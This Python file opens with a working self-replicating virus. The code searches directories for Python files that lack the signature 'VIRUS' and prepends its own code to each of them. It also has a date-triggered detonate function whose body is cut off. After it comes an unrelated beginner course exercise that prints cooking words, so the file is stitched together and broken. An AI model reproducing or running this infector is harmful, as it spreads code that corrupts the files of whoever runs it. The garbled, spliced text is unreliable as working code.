#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
#script: Ops Challenge: Class 08
# Author:  Barbara L. Beaufort
# Date of latest revision: 6/26/2023
# Purpose:  Strings and Elements
#Main

print ("List of Words Dealing With Summertime Cooking")

a = "vinegar"; b = "crushed red peppers"; c = "hot water"; d = "poultry"; e = "bbq sauce"; f = "meat mop"; g = "garlic bulbs"; h = "olive oil"; i = "eggs"; j = "potato salad"
print (d)
print (f, g, h, i, j)
k_list = ["garlic bulbs"]

for f in range(len(k_list)):
    if k_list[f] == "garlic bulbs":
        k_list[f] = "onion"

print(k_list)

#End



